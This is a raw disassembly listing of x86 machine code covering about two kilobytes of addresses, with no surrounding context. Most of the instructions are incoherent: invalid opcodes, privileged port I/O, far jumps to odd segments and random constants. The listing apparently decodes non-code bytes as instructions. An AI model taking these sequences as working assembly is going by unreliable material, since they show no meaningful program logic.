  41cc6f:	push   0x777d6c5a
  41cc74:	test   BYTE PTR [esi-0x5793e10a],cl
  41cc7a:	pop    eax
  41cc7b:	cmp    dh,bl
  41cc7d:	in     eax,0x1e
  41cc7f:	lahf   
  41cc80:	into   
  41cc81:	call   0xbdef:0xd1d0abb3
  41cc88:	pop    ss
  41cc89:	cmp    eax,DWORD PTR [ebp-0xfa27ee9]
  41cc8f:	inc    esp
  41cc90:	int3   
  41cc91:	(bad)
  41cc95:	cli    
  41cc96:	xchg   esi,eax
  41cc97:	xor    BYTE PTR [eax],dh
  41cc99:	pushf  
  41cc9a:	push   0xecf76bdc
  41cc9f:	stc    
  41cca0:	scas   eax,DWORD PTR es:[edi]
  41cca1:	cs cs pop esi
  41cca4:	in     eax,0x55
  41cca6:	ins    BYTE PTR es:[edi],dx
  41cca7:	je     0x41cc82
  41cca9:	jb     0x41cc9f
  41ccab:	addr16 push edx
  41ccad:	shl    DWORD PTR [eax+0x30],0xbd
  41ccb1:	jl     0x41cd04
  41ccb3:	mov    eax,ds:0x37d359a8
  41ccb8:	jge    0x41cc87
  41ccba:	pop    ebx
  41ccbb:	jg     0x41cc9e
  41ccbd:	add    DWORD PTR [ebx*4+0x62da835],edi
  41ccc4:	inc    ebx
  41ccc5:	fidiv  WORD PTR [edx+eax*4-0x40]
  41ccc9:	pop    ecx
  41ccca:	mov    BYTE PTR [edx+0x10],dh
  41cccd:	pop    ecx
  41ccce:	stos   DWORD PTR es:[edi],eax
  41cccf:	cwde   
  41ccd0:	sti    
  41ccd1:	out    0xb,eax
  41ccd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccd4:	mov    eax,DWORD PTR [ebx+0x30]
  41ccd7:	inc    ebx
  41ccd8:	popf   
  41ccd9:	je     0x41cd59
  41ccdb:	inc    ebx
  41ccdc:	test   eax,0x2a7ece03
  41cce1:	mov    cs,WORD PTR [eax]
  41cce3:	sub    BYTE PTR [edx+0x6e5b82e0],0xb4
  41ccea:	test   al,0xcc
  41ccec:	stos   BYTE PTR es:[edi],al
  41cced:	push   eax
  41ccee:	scas   eax,DWORD PTR es:[edi]
  41ccef:	xchg   ebx,eax
  41ccf0:	mov    bl,0xc6
  41ccf2:	jnp    0x41cce1
  41ccf4:	scas   eax,DWORD PTR es:[edi]
  41ccf5:	ja     0x41cca6
  41ccf7:	sub    cl,al
  41ccf9:	xor    ah,al
  41ccfb:	les    eax,FWORD PTR [esp+edi*8]
  41ccfe:	mov    dl,0xfc
  41cd00:	into   
  41cd01:	push   eax
  41cd02:	out    0xbe,al
  41cd04:	cwde   
  41cd05:	ins    DWORD PTR es:[edi],dx
  41cd06:	xchg   esi,eax
  41cd07:	add    BYTE PTR [ecx+0x56e80071],bl
  41cd0d:	or     al,0xa
  41cd0f:	(bad)  
  41cd11:	(bad)  
  41cd12:	xchg   ebx,eax
  41cd13:	sub    eax,0x5d2497a4
  41cd18:	cmp    ch,bl
  41cd1a:	or     edx,0x1324dcd8
  41cd20:	ds inc ebp
  41cd22:	hlt    
  41cd23:	shl    BYTE PTR [edi],0xa9
  41cd26:	xor    BYTE PTR [edi+0x737d2e7f],bh
  41cd2c:	sub    ecx,DWORD PTR [eax]
  41cd2e:	ret    
  41cd2f:	sar    DWORD PTR [edi-0x41],1
  41cd32:	dec    eax
  41cd33:	cli    
  41cd34:	push   eax
  41cd35:	ds (bad) 
  41cd37:	scas   al,BYTE PTR es:[edi]
  41cd38:	add    ebp,DWORD PTR [ecx-0x1318912f]
  41cd3e:	and    eax,0x1a79ccaa
  41cd43:	shr    BYTE PTR [ebp+ebp*1+0x1a38701e],cl
  41cd4a:	ja     0x41cd5d
  41cd4c:	(bad)  
  41cd4d:	mov    ds:0x91665a03,eax
  41cd52:	fwait
  41cd53:	sbb    BYTE PTR [ecx-0x38],0x20
  41cd57:	idiv   BYTE PTR es:[ecx+eax*1+0x6b49ddbf]
  41cd5f:	or     al,0x62
  41cd61:	sub    edi,eax
  41cd63:	adc    al,0x73
  41cd65:	ds and eax,0xda74be29
  41cd6b:	in     al,0xc2
  41cd6d:	sbb    BYTE PTR [ecx],bh
  41cd6f:	in     al,dx
  41cd70:	add    bh,dl
  41cd72:	mov    eax,ds:0xe3f2c297
  41cd77:	stos   BYTE PTR es:[edi],al
  41cd78:	loopne 0x41cd07
  41cd7a:	daa    
  41cd7b:	je     0x41cdef
  41cd7d:	add    al,0x13
  41cd7f:	mov    al,ds:0x6da97ffe
  41cd84:	xchg   edx,eax
  41cd85:	out    dx,al
  41cd86:	jno    0x41cdd0
  41cd88:	sbb    DWORD PTR [ecx],esp
  41cd8a:	xor    BYTE PTR [ebx+0x71],bh
  41cd8d:	sub    esp,esi
  41cd8f:	sbb    DWORD PTR [ebx-0x793c2b48],ebp
  41cd95:	or     bh,BYTE PTR [edx-0x1a66b3df]
  41cd9b:	xor    dh,BYTE PTR [esi]
  41cd9d:	(bad)  
  41cd9e:	ret    
  41cd9f:	test   DWORD PTR [ebp+eax*8+0x4],esi
  41cda3:	xor    BYTE PTR ds:0x9c16dfbe,dh
  41cda9:	jp     0x41cdc7
  41cdab:	or     eax,0x50155be7
  41cdb0:	add    al,0x54
  41cdb2:	cmp    ah,dh
  41cdb4:	mov    bh,BYTE PTR [edi+eiz*2-0x1a]
  41cdb8:	cs inc esp
  41cdba:	dec    esp
  41cdbb:	push   ss
  41cdbc:	dec    ebp
  41cdbd:	push   eax
  41cdbe:	call   0x9b0b:0xdb932b6e
  41cdc5:	(bad)  
  41cdc6:	xchg   ecx,eax
  41cdc7:	push   ds
  41cdc8:	dec    ecx
  41cdc9:	ds jne 0x41ce23
  41cdcc:	mov    BYTE PTR [edi+ebp*4],0xec
  41cdd0:	out    dx,al
  41cdd1:	ror    BYTE PTR [eax+ecx*2],cl
  41cdd4:	ja     0x41ce16
  41cdd6:	push   cs
  41cdd7:	pop    edx
  41cdd8:	xchg   edx,eax
  41cdd9:	push   ebx
  41cdda:	mov    ch,0xd1
  41cddc:	outs   dx,BYTE PTR ds:[esi]
  41cddd:	fist   DWORD PTR [ebx+ecx*1+0x63]
  41cde1:	xchg   ebx,eax
  41cde2:	xor    BYTE PTR [ebp-0x68],ah
  41cde5:	sub    al,0x99
  41cde7:	mov    cl,0x3b
  41cde9:	test   eax,0xa3dd9f0a
  41cdee:	dec    ebx
  41cdef:	ss sbb eax,0x22aae9cd
  41cdf5:	pop    esp
  41cdf6:	ror    BYTE PTR [ecx-0x6e],1
  41cdf9:	sar    BYTE PTR ds:0x8e725fe0,cl
  41cdff:	test   DWORD PTR [ebx-0x1308eb9a],eax
  41ce05:	outs   dx,DWORD PTR ds:[esi]
  41ce06:	push   esp
  41ce07:	push   ss
  41ce08:	sahf   
  41ce09:	rol    BYTE PTR [edx],cl
  41ce0b:	ss push cs
  41ce0d:	lods   eax,DWORD PTR ds:[esi]
  41ce0e:	mov    ebx,0x549f484
  41ce13:	adc    al,0x99
  41ce15:	xor    dl,bl
  41ce17:	xchg   ecx,eax
  41ce18:	test   BYTE PTR [ecx+0x47],bl
  41ce1b:	push   ds
  41ce1c:	fild   DWORD PTR [ecx]
  41ce1e:	and    al,BYTE PTR [ecx+0x12]
  41ce21:	mov    esi,0x879756fa
  41ce26:	je     0x41ce09
  41ce28:	adc    DWORD PTR [eax-0x77270fa4],edx
  41ce2e:	add    eax,0xc7aa2933
  41ce33:	adc    edi,DWORD PTR [esi-0x28eef590]
  41ce39:	or     eax,0xdf5b2645
  41ce3e:	repz bnd jb 0x41cdc3
  41ce42:	test   BYTE PTR [edx+0x7d],ch
  41ce45:	cdq    
  41ce46:	mov    ds:0x13fb4cf9,eax
  41ce4b:	dec    esi
  41ce4c:	xchg   esi,eax
  41ce4d:	ds ins DWORD PTR es:[edi],dx
  41ce4f:	jnp    0x41cde1
  41ce51:	add    cl,BYTE PTR [eax+0x4e]
  41ce54:	pop    ecx
  41ce55:	mov    ah,0xf
  41ce57:	mov    ss,WORD PTR [eax]
  41ce59:	scas   al,BYTE PTR es:[edi]
  41ce5a:	jnp    0x41cde8
  41ce5c:	push   esp
  41ce5d:	sub    BYTE PTR [ecx+0x7d84e691],ah
  41ce63:	cs pop esp
  41ce65:	lds    edi,FWORD PTR [ebp+0x29]
  41ce68:	push   ebx
  41ce69:	jmp    0x41ce02
  41ce6b:	adc    al,0x7e
  41ce6d:	add    BYTE PTR [edi],ch
  41ce6f:	push   ebx
  41ce70:	in     al,0x35
  41ce72:	inc    esp
  41ce73:	add    edi,DWORD PTR [edx+0x7e714ddc]
  41ce79:	sub    eax,ecx
  41ce7b:	popf   
  41ce7c:	cmp    eax,esp
  41ce7e:	jmp    0x41ce20
  41ce80:	push   ebp
  41ce81:	scas   al,BYTE PTR es:[edi]
  41ce82:	mov    eax,ds:0xec9084e3
  41ce87:	cmp    BYTE PTR [ecx+0x751631cf],ah
  41ce8d:	mov    dl,0xe6
  41ce8f:	xor    al,0xa5
  41ce91:	in     al,0xfc
  41ce93:	jno    0x41cea2
  41ce95:	sti    
  41ce96:	test   DWORD PTR [esi-0x61],eax
  41ce99:	push   edx
  41ce9a:	cmp    BYTE PTR [ecx-0x19bd1727],dl
  41cea0:	int    0xdc
  41cea2:	fwait
  41cea3:	or     eax,0x99303c11
  41cea8:	jl     0x41ce46
  41ceaa:	fs xor ecx,ecx
  41cead:	mov    ebx,0xbb957a1e
  41ceb2:	(bad)  
  41ceb3:	fadd   st,st(5)
  41ceb5:	mov    dl,0xcd
  41ceb7:	lods   al,BYTE PTR ds:[esi]
  41ceb8:	xor    ebx,DWORD PTR [edi-0x2]
  41cebb:	clc    
  41cebc:	adc    cl,BYTE PTR [edi+0x48]
  41cebf:	and    BYTE PTR [edi-0x6f4fba80],dl
  41cec5:	mov    cl,0x33
  41cec7:	jecxz  0x41cf37
  41cec9:	mov    al,ds:0xd1caa4ec
  41cece:	cmp    BYTE PTR [ebx+0x2b3efad1],bh
  41ced4:	dec    esi
  41ced5:	sbb    esp,DWORD PTR [ebx]
  41ced7:	pop    esi
  41ced8:	inc    ebx
  41ced9:	mov    bl,0x90
  41cedb:	mov    eax,ds:0xd743b9e6
  41cee0:	fmul   st(3),st
  41cee2:	std    
  41cee3:	or     dl,BYTE PTR [edx-0x3f]
  41cee6:	jle    0x41cef9
  41cee8:	iret   
  41cee9:	jno    0x41cf26
  41ceeb:	fwait
  41ceec:	repz shr BYTE PTR [edi+0x5caf9846],1
  41cef3:	jne    0x41ce94
  41cef5:	add    al,0x58
  41cef7:	rcr    esp,1
  41cef9:	or     DWORD PTR [esi],0x43
  41cefc:	clc    
  41cefd:	pop    es
  41cefe:	sub    dl,BYTE PTR [ecx-0xdd5befb]
  41cf04:	popf   
  41cf05:	dec    esp
  41cf06:	out    0xac,eax
  41cf08:	repz cld 
  41cf0a:	add    edi,edi
  41cf0c:	shr    bl,0xc2
  41cf0f:	xchg   ebx,eax
  41cf10:	in     al,dx
  41cf11:	inc    ebx
  41cf12:	jae    0x41cec4
  41cf14:	mov    edx,0x6603fae7
  41cf19:	or     edx,0x8
  41cf1c:	popf   
  41cf1d:	jl     0x41cf42
  41cf1f:	loope  0x41cf95
  41cf21:	ret    
  41cf22:	rcr    DWORD PTR [ebx+0x73],0xaa
  41cf26:	fmul   st(3),st
  41cf28:	test   DWORD PTR [ebx+0x7784a242],0x3fb96522
  41cf32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf33:	imul   edx
  41cf35:	fisub  WORD PTR [esi]
  41cf37:	sbb    DWORD PTR [ebp+0x58461c38],edi
  41cf3d:	mov    esi,0x50ac3ea2
  41cf42:	mov    dh,0x5
  41cf44:	jno    0x41cfc4
  41cf46:	inc    ebp
  41cf47:	test   eax,0x3b428ca4
  41cf4c:	dec    edx
  41cf4d:	shl    cl,0x2a
  41cf50:	inc    esp
  41cf51:	sbb    BYTE PTR [ecx-0x1a],cl
  41cf54:	sbb    al,0xcd
  41cf56:	mov    esp,0xebb0f7df
  41cf5b:	ins    BYTE PTR es:[edi],dx
  41cf5c:	(bad)  
  41cf5d:	nop
  41cf5e:	or     eax,eax
  41cf60:	pop    eax
  41cf61:	cmp    DWORD PTR [eax-0x1028e93e],0x37
  41cf68:	xchg   DWORD PTR [esi+0x4d340df2],edx
  41cf6e:	and    BYTE PTR [esi],ah
  41cf70:	aad    0x18
  41cf72:	aas    
  41cf73:	push   ebp
  41cf74:	xor    eax,DWORD PTR [esi+0x6e]
  41cf77:	js     0x41cf7a
  41cf79:	add    bl,BYTE PTR [ebx]
  41cf7b:	js     0x41cfb1
  41cf7d:	mov    cl,0x1e
  41cf7f:	pop    ecx
  41cf80:	cmp    DWORD PTR [eax-0x2c],ebp
  41cf83:	and    eax,0x670bf7b
  41cf88:	test   eax,0xa2712fa2
  41cf8d:	pop    edi
  41cf8e:	push   cs
  41cf8f:	sub    BYTE PTR [esi+0x14ef30c4],0xc2
  41cf96:	lahf   
  41cf97:	test   DWORD PTR [edi-0x29cb9fae],ebx
  41cf9d:	sbb    bh,BYTE PTR gs:[edx+0x7b]
  41cfa1:	rcl    dh,1
  41cfa3:	das    
  41cfa4:	jecxz  0x41cfdc
  41cfa6:	pop    esi
  41cfa7:	jmp    0x10e68a42
  41cfac:	iret   
  41cfad:	pop    ebp
  41cfae:	add    BYTE PTR [eax],al
  41cfb0:	add    BYTE PTR [eax],al
  41cfb2:	jnp    0x41cf7d
  41cfb4:	xor    bh,0xb2
  41cfb7:	(bad)  
  41cfb8:	jg     0x41cf87
  41cfba:	sbb    DWORD PTR [esp+esi*1-0x5b],0x31cdccc1
  41cfc2:	pop    ecx
  41cfc3:	dec    ebx
  41cfc4:	add    DWORD PTR [eax],eax
  41cfc6:	hlt    
  41cfc7:	add    al,0x0
  41cfc9:	add    BYTE PTR [esi+0x312d6aa0],al
  41cfcf:	fidiv  DWORD PTR [ebp+0x415587e3]
  41cfd5:	scas   al,BYTE PTR es:[edi]
  41cfd6:	sbb    ebx,edi
  41cfd8:	mov    ah,0x59
  41cfda:	out    dx,eax
  41cfdb:	iret   
  41cfdc:	div    BYTE PTR [esi-0x22]
  41cfdf:	jbe    0x41d006
  41cfe1:	pop    ecx
  41cfe2:	stos   BYTE PTR es:[edi],al
  41cfe3:	pop    ss
  41cfe4:	stos   DWORD PTR es:[edi],eax
  41cfe5:	mov    cl,0xc6
  41cfe7:	sbb    bh,BYTE PTR ds:0x65a631f0
  41cfed:	jle    0x41cfa8
  41cfef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cff0:	mov    dh,0xd3
  41cff2:	rcr    BYTE PTR [edi+0x58c96a94],cl
  41cff8:	push   es
  41cff9:	iret   
  41cffa:	xchg   esp,eax
  41cffb:	outs   dx,DWORD PTR ds:[esi]
  41cffc:	sti    
  41cffd:	rol    eax,0x3b
  41d000:	ja     0x41d047
  41d002:	stos   BYTE PTR es:[edi],al
  41d003:	retf   0x4bec
  41d006:	aas    
  41d007:	les    edi,FWORD PTR [ecx-0x3ae8d22e]
  41d00d:	fild   WORD PTR ds:0x65b13108
  41d013:	mov    bh,0xb
  41d015:	pop    ecx
  41d016:	mov    edx,0x2eb9f205
  41d01b:	retf   0x9c02
  41d01e:	int3   
  41d01f:	into   
  41d020:	rcr    DWORD PTR ds:0x7b2eb9da,cl
  41d026:	cwde   
  41d027:	jnp    0x41cfb9
  41d029:	call   0x23b2bb64
  41d02e:	scas   al,BYTE PTR es:[edi]
  41d02f:	sub    DWORD PTR [ebx+eiz*8],edi
  41d032:	sub    eax,0x51eec36e
  41d037:	jno    0x41d079
  41d039:	push   cs
  41d03a:	enter  0x3e8f,0xf4
  41d03e:	lods   eax,DWORD PTR ds:[esi]
  41d03f:	jmp    0x974d04d
  41d044:	loopne 0x41cfdc
  41d046:	into   
  41d047:	push   edi
  41d048:	adc    ah,dh
  41d04a:	adc    BYTE PTR [esi+edi*4-0x76],0x45
  41d04f:	jo     0x41cfde
  41d051:	leave  
  41d052:	loope  0x41d020
  41d054:	jge    0x41d022
  41d056:	cmp    DWORD PTR [esi-0x9e0ee96],esp
  41d05c:	push   ss
  41d05d:	popf   
  41d05e:	jmp    0x41d0b5
  41d060:	xor    ecx,DWORD PTR [eax-0x10381fb3]
  41d066:	sub    dl,BYTE PTR [edx+0x5]
  41d069:	imul   eax,esp,0x50
  41d06c:	mov    bl,0xa1
  41d06e:	loopne 0x41d083
  41d070:	fimul  DWORD PTR [ebx+0x4f19a6b3]
  41d076:	(bad)  
  41d077:	cmp    ecx,0xffffffe9
  41d07a:	rcr    BYTE PTR [ecx+0x74],0x9e
  41d07e:	nop
  41d07f:	mov    DWORD PTR [esi],esp
  41d081:	pop    esi
  41d082:	fnstcw WORD PTR [edi+0x792bf246]
  41d088:	dec    esp
  41d089:	sbb    eax,DWORD PTR [esi]
  41d08b:	inc    esi
  41d08c:	int    0xa6
  41d08e:	or     BYTE PTR [esp+eax*2-0x523ccacd],dl
  41d095:	lea    esp,[ebx-0x74f68d33]
  41d09b:	pop    ebp
  41d09c:	imul   edx,DWORD PTR ds:0xcc8d9ea2,0xfffffff9
  41d0a3:	xchg   DWORD PTR [ecx-0x6f3c9c82],ebp
  41d0a9:	imul   ecx,DWORD PTR [ebp-0x867a596],0x5cc7e3b
  41d0b3:	loope  0x41d102
  41d0b5:	adc    DWORD PTR [edx+0x57],ebp
  41d0b8:	es jb  0x41d0d9
  41d0bb:	imul   esi,DWORD PTR [eax],0x216fd29a
  41d0c1:	push   ss
  41d0c2:	add    ebp,DWORD PTR [ebp+0x2f90fcce]
  41d0c8:	sub    cl,BYTE PTR [edx-0x1824a72d]
  41d0ce:	inc    esp
  41d0cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0d0:	mov    ds:0x7557a75,eax
  41d0d5:	mov    bl,0x92
  41d0d7:	(bad)
  41d0db:	push   ebp
  41d0dc:	out    dx,eax
  41d0dd:	mov    eax,0x556be7f4
  41d0e2:	dec    edx
  41d0e3:	mov    ebp,0xc9cb50c6
  41d0e8:	pop    edx
  41d0e9:	cmc    
  41d0ea:	mov    cl,0xaf
  41d0ec:	in     al,0x39
  41d0ee:	inc    esi
  41d0ef:	jecxz  0x41d12c
  41d0f1:	call   0xcfbb9c7
  41d0f6:	fwait
  41d0f7:	repnz pushf 
  41d0f9:	jp     0x41d0d7
  41d0fb:	lahf   
  41d0fc:	jp     0x41d171
  41d0fe:	push   es
  41d0ff:	loop   0x41d0c0
  41d101:	es imul esi,edx,0xffffffb9
  41d105:	adc    eax,0x3b9f8b6e
  41d10a:	cmc    
  41d10b:	jnp    0x41d0ea
  41d10d:	xor    BYTE PTR [eax-0x3132eddc],0xab
  41d114:	inc    eax
  41d115:	or     BYTE PTR [ebx-0x6e],al
  41d118:	inc    edi
  41d119:	jbe    0x41d0cd
  41d11b:	ins    BYTE PTR es:[edi],dx
  41d11c:	mov    ch,0x6b
  41d11e:	out    0xb6,eax
  41d120:	cmp    bh,dh
  41d122:	sbb    edi,eax
  41d124:	cmp    eax,0x6360d40b
  41d129:	dec    edi
  41d12a:	sbb    eax,0x27170603
  41d12f:	xchg   esi,eax
  41d130:	aam    0x1f
  41d132:	add    BYTE PTR [ebp-0x29],dh
  41d135:	out    0x69,eax
  41d137:	and    ah,bh
  41d139:	and    bh,BYTE PTR [esi-0x7b]
  41d13c:	cmp    al,0x43
  41d13e:	xlat   BYTE PTR ds:[ebx]
  41d13f:	and    ebx,DWORD PTR [ecx-0x76]
  41d142:	mov    DWORD PTR [eax+0x50],ebp
  41d145:	inc    esi
  41d146:	sub    al,0xad
  41d148:	mov    WORD PTR [edx],?
  41d14a:	imul   edx,DWORD PTR [ebx+0x41],0xffffff9a
  41d14e:	loope  0x41d131
  41d150:	aam    0x34
  41d152:	xchg   ebp,eax
  41d153:	jmp    0xbfcf:0xba7ab6a3
  41d15a:	sbb    BYTE PTR [ecx*4+0xfa40036],dh
  41d161:	test   BYTE PTR [edx],ah
  41d163:	xor    DWORD PTR [eax+0xa],ebp
  41d166:	mov    WORD PTR [esi],ds
  41d168:	in     al,0xc8
  41d16a:	arpl   WORD PTR [esi+ecx*4-0x2a],cx
  41d16e:	lock pop ebp
  41d170:	pusha  
  41d171:	call   0xcdb9:0x129bcd83
  41d178:	xchg   esi,eax
  41d179:	pop    ebp
  41d17a:	mov    ds:0x97697f69,eax
  41d17f:	int3   
  41d180:	in     al,dx
  41d181:	or     DWORD PTR [edx-0x6feb8886],esi
  41d187:	jo     0x41d19b
  41d189:	dec    DWORD PTR [ebx-0x98a8451]
  41d18f:	sub    DWORD PTR [edx+eax*2],0x44
  41d193:	sub    bl,BYTE PTR [eax-0x33]
  41d196:	xor    al,0x6d
  41d198:	inc    eax
  41d199:	retf   
  41d19a:	dec    cx
  41d19c:	mov    edx,0x5bc8a3e7
  41d1a1:	cvtdq2ps xmm1,XMMWORD PTR [ecx-0x3e]
  41d1a5:	sbb    BYTE PTR [edx],dl
  41d1a7:	adc    al,0xd
  41d1a9:	or     esp,edx
  41d1ab:	xchg   BYTE PTR [esi],ah
  41d1ad:	clc    
  41d1ae:	xchg   ecx,eax
  41d1af:	mov    ds:0xeb50ec91,al
  41d1b4:	(bad)  
  41d1b5:	jecxz  0x41d20f
  41d1b7:	fcmovne st,st(1)
  41d1b9:	repz sbb esp,DWORD PTR [esi-0x32]
  41d1bd:	stos   BYTE PTR es:[edi],al
  41d1be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1bf:	rol    BYTE PTR [ebp+0x3e],1
  41d1c2:	push   edi
  41d1c3:	out    0xf,al
  41d1c5:	cmp    bl,bl
  41d1c7:	dec    eax
  41d1c8:	mov    edx,0x93f7cb3d
  41d1cd:	leave  
  41d1ce:	leave  
  41d1cf:	xor    esp,edi
  41d1d1:	mov    edi,esi
  41d1d3:	inc    esi
  41d1d4:	jl     0x41d1cb
  41d1d6:	in     al,dx
  41d1d7:	inc    edx
  41d1d8:	push   0xe34acc7c
  41d1dd:	mov    dl,bl
  41d1df:	inc    ebx
  41d1e0:	and    al,0xab
  41d1e2:	sbb    eax,DWORD PTR [ebx]
  41d1e4:	sahf   
  41d1e5:	out    dx,eax
  41d1e6:	jmp    0x4182:0xd319c4b4
  41d1ed:	cld    
  41d1ee:	push   ds
  41d1ef:	pop    edi
  41d1f0:	dec    edx
  41d1f1:	dec    esp
  41d1f2:	push   es
  41d1f3:	xor    ecx,DWORD PTR [ebp+0x7f0cca1e]
  41d1f9:	sbb    eax,0x3ed8d2ed
  41d1fe:	adc    al,0x5
  41d200:	(bad)  
  41d201:	xlat   BYTE PTR ds:[ebx]
  41d202:	mov    dl,BYTE PTR [eax+eax*8-0x3e9fbb27]
  41d209:	or     eax,0x6e94025a
  41d20e:	test   DWORD PTR [ecx],ebp
  41d210:	shl    DWORD PTR [ebp+0x44],0x9f
  41d214:	loop   0x41d243
  41d216:	and    DWORD PTR [eax+0x68],ebx
  41d219:	shl    al,0x47
  41d21c:	cmp    DWORD PTR [esi+esi*8+0x3944e7fa],ecx
  41d223:	sbb    eax,0x293e72c3
  41d228:	mov    BYTE PTR [ebx-0x17],ah
  41d22b:	scas   al,BYTE PTR es:[edi]
  41d22c:	into   
  41d22d:	aad    0xb4
  41d22f:	(bad)  
  41d230:	addr16 aam 0x62
  41d233:	loopne 0x41d29f
  41d235:	je     0x41d23b
  41d237:	jae    0x41d27b
  41d239:	mov    ah,0x12
  41d23b:	fstp   DWORD PTR [eax+eiz*2+0x18bfe5ca]
  41d242:	sahf   
  41d243:	jns    0x41d23a
  41d245:	les    esp,FWORD PTR [esi+0x7b7849c0]
  41d24b:	xchg   BYTE PTR [ecx],ch
  41d24d:	push   ds
  41d24e:	bound  esi,QWORD PTR [ebx-0x36a79aad]
  41d254:	adc    esp,DWORD PTR [edi]
  41d256:	mov    ch,0x44
  41d258:	xchg   ebp,eax
  41d259:	and    DWORD PTR [ecx],ecx
  41d25b:	or     al,0x77
  41d25d:	mov    ss,WORD PTR [ebp+0x6c03980a]
  41d263:	and    DWORD PTR [esi],edi
  41d265:	sahf   
  41d266:	push   ebx
  41d267:	lods   al,BYTE PTR ds:[esi]
  41d268:	fcom   DWORD PTR [eax+0x32]
  41d26b:	cmp    al,0x6
  41d26d:	dec    ebp
  41d26e:	jnp    0x41d1fb
  41d270:	dec    edx
  41d271:	cmp    al,0xa7
  41d273:	fld    QWORD PTR [eax]
  41d275:	xchg   DWORD PTR [eax+eax*1],edi
  41d278:	test   eax,0x2e4dd2d2
  41d27d:	dec    edx
  41d27e:	into   
  41d27f:	push   edx
  41d280:	ja     0x41d2aa
  41d282:	xor    al,0xc8
  41d284:	test   DWORD PTR [ebx+ebp*1+0x4dcf83e7],esi
  41d28b:	aad    0x48
  41d28d:	sub    ebx,DWORD PTR ds:0x8bd3a971
  41d293:	adc    dl,ch
  41d295:	inc    esi
  41d296:	leave  
  41d297:	and    eax,ebp
  41d299:	push   es
  41d29a:	mov    edx,0x527c38a1
  41d29f:	mov    ch,0xf6
  41d2a1:	push   edx
  41d2a2:	ins    DWORD PTR es:[edi],dx
  41d2a3:	sahf   
  41d2a4:	xchg   ebx,eax
  41d2a5:	outs   dx,BYTE PTR ds:[esi]
  41d2a6:	push   ss
  41d2a7:	(bad)  
  41d2a9:	mov    BYTE PTR [edi-0x2738501a],ch
  41d2af:	out    0xd7,eax
  41d2b1:	jbe    0x41d24d
  41d2b3:	xchg   ebp,eax
  41d2b4:	push   eax
  41d2b5:	outs   dx,DWORD PTR ds:[esi]
  41d2b6:	mov    dl,BYTE PTR [edx]
  41d2b8:	push   ss
  41d2b9:	je     0x41d24b
  41d2bb:	arpl   WORD PTR [esp+eax*1],sp
  41d2be:	adc    edx,DWORD PTR [ebp+0x37]
  41d2c1:	or     BYTE PTR [ebx],0xa4
  41d2c4:	pop    esi
  41d2c5:	xor    edi,DWORD PTR [ecx+ebp*8-0xe6cf2b4]
  41d2cc:	and    BYTE PTR [edi-0x2b40acc1],cl
  41d2d2:	cs push ebp
  41d2d4:	adc    dl,BYTE PTR [edi+ebp*1+0x1f]
  41d2d8:	lods   eax,DWORD PTR ds:[esi]
  41d2d9:	jns    0x41d355
  41d2db:	mov    ah,0xa4
  41d2de:	mov    cs,eax
  41d2e0:	cmp    eax,eax
  41d2e2:	adc    BYTE PTR [ecx-0x68e4a361],ch
  41d2e8:	mov    al,0xd3
  41d2ea:	and    bl,cl
  41d2ec:	add    DWORD PTR [ebx+0x259fe9d7],edx
  41d2f2:	xor    DWORD PTR [esp+eiz*2-0x36650ac2],0xffffff98
  41d2fa:	jge    0x41d305
  41d2fc:	into   
  41d2fd:	and    eax,0x6733dada
  41d302:	es and bh,bh
  41d305:	mov    ch,0x3
  41d307:	mov    DWORD PTR [ecx],0x1bdaaec3
  41d30d:	and    BYTE PTR [ebx+0xd],dh
  41d310:	dec    eax
  41d311:	mov    edi,0xf8739389
  41d316:	mov    edi,0x166b99c6
  41d31b:	dec    ebp
  41d31c:	mov    dl,0x92
  41d31e:	push   ecx
  41d31f:	cmp    al,0x20
  41d321:	pop    ds
  41d322:	mov    ecx,0xf1953704
  41d327:	imul   edi,DWORD PTR [ebp-0x7e],0x5a
  41d32b:	loope  0x41d35b
  41d32d:	mov    al,ds:0xf4cb96b2
  41d332:	inc    ebp
  41d333:	dec    esp
  41d334:	(bad)  
  41d335:	mov    cl,0x2b
  41d337:	push   ds
  41d338:	sti    
  41d339:	cdq    
  41d33a:	sahf   
  41d33b:	pushf  
  41d33c:	jmp    0x8855:0xa8564915
  41d343:	es mov ebp,0x8b032cf3
  41d349:	imul   esi,DWORD PTR [ecx+eiz*1+0x27],0x3b
  41d34e:	add    bl,0x32
  41d351:	add    al,0xba
  41d353:	out    dx,al
  41d354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d355:	pushf  
  41d356:	popa   
  41d357:	ficomp WORD PTR [edi+0x31]
  41d35a:	sbb    bl,ah
  41d35c:	mov    es,ebp
  41d35e:	mov    ebx,0x35e6f99d
  41d363:	out    dx,eax
  41d364:	ins    DWORD PTR es:[edi],dx
  41d365:	pop    edx
  41d366:	mov    esp,0xc45998df
  41d36b:	sbb    al,BYTE PTR ds:0x5946299a
  41d371:	outs   dx,BYTE PTR ds:[esi]
  41d372:	mov    esi,0x9258a65b
  41d377:	out    dx,eax
  41d378:	lock push 0x37
  41d37b:	outs   dx,DWORD PTR fs:[esi]
  41d37d:	aaa    
  41d37e:	add    eax,0xd7d78990
  41d383:	or     DWORD PTR [ebx+0x4e],ecx
  41d386:	xor    eax,0x23bbe07d
  41d38b:	inc    esi
  41d38c:	fwait
  41d38d:	adc    dh,BYTE PTR [ecx+ecx*1]
  41d390:	stos   BYTE PTR es:[edi],al
  41d391:	push   edi
  41d392:	xchg   ecx,eax
  41d393:	push   edx
  41d394:	daa    
  41d395:	jns    0x41d3c3
  41d397:	retf   
  41d398:	mov    al,0x5
  41d39a:	adc    ch,bh
  41d39c:	mov    ebp,0x4a6d7b13
  41d3a1:	and    al,0x5d
  41d3a3:	repnz adc al,0x31
  41d3a6:	idiv   BYTE PTR [eax+0x11f7fbcd]
  41d3ac:	dec    ebx
  41d3ad:	scas   eax,DWORD PTR es:[edi]
  41d3ae:	fisubr DWORD PTR [ebx+0x28ef9207]
  41d3b4:	mov    ds:0x731c12d3,al
  41d3b9:	xchg   edx,eax
  41d3ba:	(bad)  
  41d3bc:	in     ax,dx
  41d3be:	push   ebx
  41d3bf:	sbb    esi,DWORD PTR [ebp+ecx*4-0x1ef2ec86]
  41d3c6:	xchg   ebx,esp
  41d3c8:	sar    eax,0x1
  41d3cb:	shr    DWORD PTR [ebx-0x5b50ffdf],0x9f
